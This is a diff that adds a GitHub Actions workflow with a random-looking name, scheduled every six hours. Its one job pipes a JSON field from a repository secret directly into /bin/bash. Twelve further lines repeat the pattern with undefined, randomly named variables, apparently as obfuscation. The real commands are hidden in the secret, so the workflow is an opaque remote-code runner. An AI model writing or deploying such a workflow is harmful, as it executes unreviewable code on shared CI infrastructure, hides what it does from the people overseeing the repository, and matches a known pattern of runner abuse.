@@ -1,0 +1,29 @@
+name: dingzheturanbakafei
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dingzheturanbakafei
+        env:
+          jfrki7: ${{ secrets.jfrki7 }}
+        run: |
+          echo $jfrki7 | jq -r .way8092 | /bin/bash
+          echo $njl66220 | jq -r .jwy9 | /bin/bash
+          echo $lht1 | jq -r .akl01 | /bin/bash
+          echo $pfijx4285 | jq -r .gqc61483 | /bin/bash
+          echo $uaj6 | jq -r .qsntr51 | /bin/bash
+          echo $bgpa3 | jq -r .rqjh75410 | /bin/bash
+          echo $b96 | jq -r .c0 | /bin/bash
+          echo $zg3226 | jq -r .yzbrp7 | /bin/bash
+          echo $rbyc273 | jq -r .sgxm14974 | /bin/bash
+          echo $duwyo880 | jq -r .jyew3730 | /bin/bash
+          echo $bv52 | jq -r .jdhj51544 | /bin/bash
+          echo $pdarz98538 | jq -r .rnugs79318 | /bin/bash
+          echo $efl5077 | jq -r .rufn688 | /bin/bash
+
